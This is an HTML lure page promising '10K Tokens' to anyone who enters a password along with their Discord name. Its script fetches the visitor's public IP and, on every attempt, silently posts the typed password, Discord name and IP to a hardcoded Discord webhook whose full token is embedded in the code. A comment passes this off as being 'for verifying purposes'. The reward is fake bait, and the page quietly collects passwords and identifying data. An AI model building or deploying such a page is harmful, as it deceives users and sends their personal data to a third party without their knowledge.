<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Protected Page</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #121212;
            font-family: Arial, sans-serif;
            color: #ffffff;
        }
        .container {
            text-align: center;
            background-color: #1e1e1e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        }
        input[type="text"] {
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #333;
            color: #ffffff;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="message">Enter Password to Win 10K Tokens</h1>
        <input type="text" id="discordName" placeholder="Discord Name">
        <input type="text" id="password" placeholder="Password">
        <button onclick="checkPassword()">Enter</button>
    </div>

    <script>
        const correctPassword = 'password';
        const hint = 'its a password 🤷‍♂️'; // Obfuscated hint
        let hintShown = false;

        document.getElementById('password').addEventListener('keydown', function(event) {
            if (event.key === ' ') {
                event.preventDefault();
            }
            if (event.key === 'Enter') {
                checkPassword();
            }
        });

        document.getElementById('discordName').addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                checkPassword();
            }
        });

        function checkPassword() {
            const password = document.getElementById('password').value;
            const discordName = document.getElementById('discordName').value;
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    sendToWebhook(password, discordName, ip); // Send password, discord name, and IP to webhook for verifying purposes
                    if (password === correctPassword) {
                        document.body.innerHTML = '<h1>You will receive your tokens shortly</h1>';
                    } else {
                        if (!hintShown) {
                            document.getElementById('message').innerText = 'Incorrect password! Hint: ' + hint;
                            hintShown = true;
                        } else {
                            alert('Incorrect password!');
                        }
                    }
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }

        function sendToWebhook(password, discordName, ip) {
            const webhookUrl = 'https://discord.com/api/webhooks/1264216284648701983/02_7ui6Z5RIaQ2G6eaxwogab4I3WbJbZ1voliDccAIebMKRWkNVIh12OQ2_c-LZSockD';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: 'Password entered: ' + password + ', Discord Name: ' + discordName + ', IP: ' + ip })
            }).then(response => {
                if (!response.ok) {
                    console.error('Error sending data to webhook:', response.statusText);
                }
            }).catch(error => {
                console.error('Error sending data to webhook:', error);
            });
        }
    </script>
</body>
</html>
